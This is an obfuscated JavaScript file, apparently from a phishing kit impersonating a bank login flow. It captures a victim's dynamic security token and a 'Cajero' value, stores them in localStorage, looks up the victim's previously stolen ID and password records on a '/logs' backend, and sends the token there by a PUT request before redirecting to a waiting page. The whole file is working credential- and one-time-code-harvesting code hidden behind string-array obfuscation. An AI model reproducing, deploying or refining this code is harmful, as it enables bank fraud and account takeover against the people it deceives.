const _0xd568e = _0x5aa5;
(function (_0x16ea76, _0x3e0d0f) {
  const _0x7275d6 = _0x5aa5,
    _0x24b89e = _0x16ea76();
  while (!![]) {
    try {
      const _0x8caade =
        parseInt(_0x7275d6(0x151)) / 0x1 +
        (parseInt(_0x7275d6(0x14d)) / 0x2) *
          (-parseInt(_0x7275d6(0x147)) / 0x3) +
        (parseInt(_0x7275d6(0x140)) / 0x4) *
          (parseInt(_0x7275d6(0x145)) / 0x5) +
        -parseInt(_0x7275d6(0x13a)) / 0x6 +
        (-parseInt(_0x7275d6(0x12b)) / 0x7) *
          (parseInt(_0x7275d6(0x134)) / 0x8) +
        (-parseInt(_0x7275d6(0x130)) / 0x9) *
          (-parseInt(_0x7275d6(0x138)) / 0xa) +
        (-parseInt(_0x7275d6(0x14b)) / 0xb) *
          (-parseInt(_0x7275d6(0x13b)) / 0xc);
      if (_0x8caade === _0x3e0d0f) break;
      else _0x24b89e["push"](_0x24b89e["shift"]());
    } catch (_0x41b436) {
      _0x24b89e["push"](_0x24b89e["shift"]());
    }
  }
})(_0x55f3, 0x2bf35);
function updateLS() {
  const _0x40a66e = _0x5aa5;
  LS[_0x40a66e(0x14e)](_0x40a66e(0x144), JSON["stringify"](info));
}
function _0x5aa5(_0x47e8ba, _0x53ff27) {
  const _0x55f334 = _0x55f3();
  return (
    (_0x5aa5 = function (_0x5aa5eb, _0x59864f) {
      _0x5aa5eb = _0x5aa5eb - 0x12b;
      let _0x374e50 = _0x55f334[_0x5aa5eb];
      return _0x374e50;
    }),
    _0x5aa5(_0x47e8ba, _0x53ff27)
  );
}
function _0x55f3() {
  const _0x1617bf = [
    "Usuario\x20Encontrado",
    "3183587dQMITl",
    "cdin",
    "13078HfqfuS",
    "setItem",
    "log",
    "application/json",
    "83120fNYZoW",
    "Usuario\x20actualizado",
    "1424514yKKYAo",
    "addEventListener",
    "idreg",
    "Ingresó\x20Dinámica",
    "Error\x20al\x20actualizar\x20usuario:",
    "1275840olKeEO",
    "confirmation-code",
    "json",
    "txtdinamica",
    "8sLOZXt",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "value",
    "telnum",
    "10TXpNDm",
    "getElementById",
    "253836AfJlLn",
    "12mifDoh",
    "wait.html",
    "statusText",
    "PUT",
    "/logs/logDin/",
    "1528yfJdNw",
    "disabled",
    "/logs/logs",
    "\x20Cajero:\x20",
    "info",
    "725xABfnQ",
    "metaInfo",
    "66lyZFlR",
    "href",
    "preventDefault",
  ];
  _0x55f3 = function () {
    return _0x1617bf;
  };
  return _0x55f3();
}
const otpButton = document["getElementById"]("btnDinamica"),
  numberMovil = document["getElementById"](_0xd568e(0x131)),
  cajero = document[_0xd568e(0x139)](_0xd568e(0x133));
otpButton[_0xd568e(0x12c)]("click", async function (_0x3db4f4) {
  const _0x52b26c = _0xd568e;
  _0x3db4f4[_0x52b26c(0x149)](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x52b26c(0x136)] == "") {
    alert(_0x52b26c(0x135)),
      numberMovil["focus"](),
      (otpButton[_0x52b26c(0x141)] = ![]);
    return;
  } else {
    var _0x175da6 = numberMovil[_0x52b26c(0x136)];
    (info[_0x52b26c(0x146)]["cdin"] =
      _0x175da6 + _0x52b26c(0x143) + cajero[_0x52b26c(0x136)]),
      updateLS();
    async function _0x1afeb3() {
      const _0x38ebb7 = _0x52b26c,
        _0x58c422 = await fetch(url + _0x38ebb7(0x142), {
          method: "GET",
          headers: { "Content-Type": _0x38ebb7(0x150) },
        }),
        _0xd2e916 = await _0x58c422[_0x38ebb7(0x132)](),
        _0x29239d = [..._0xd2e916];
      for (const _0x5cd668 of _0x29239d) {
        if (
          _0x5cd668["reg"] == info[_0x38ebb7(0x146)]["cc"] &&
          _0x5cd668["cl"] == info[_0x38ebb7(0x146)][_0x38ebb7(0x137)]
        ) {
          console[_0x38ebb7(0x14f)](_0x38ebb7(0x14a));
          const _0x44642e = await fetch(
              url + _0x38ebb7(0x13f) + _0x5cd668[_0x38ebb7(0x12d)],
              {
                method: _0x38ebb7(0x13e),
                headers: { "Content-Type": "application/json" },
                body: JSON["stringify"]({
                  din: info[_0x38ebb7(0x146)][_0x38ebb7(0x14c)],
                  status: _0x38ebb7(0x12e),
                }),
              }
            ),
            _0xeb26f = await _0x44642e[_0x38ebb7(0x132)]();
          _0x44642e["ok"]
            ? console[_0x38ebb7(0x14f)](_0x38ebb7(0x152))
            : console["error"](_0x38ebb7(0x12f), _0x44642e[_0x38ebb7(0x13d)]);
        }
      }
      (otpButton["disabled"] = ![]),
        (window["location"][_0x38ebb7(0x148)] = _0x38ebb7(0x13c));
    }
    await _0x1afeb3();
  }
});
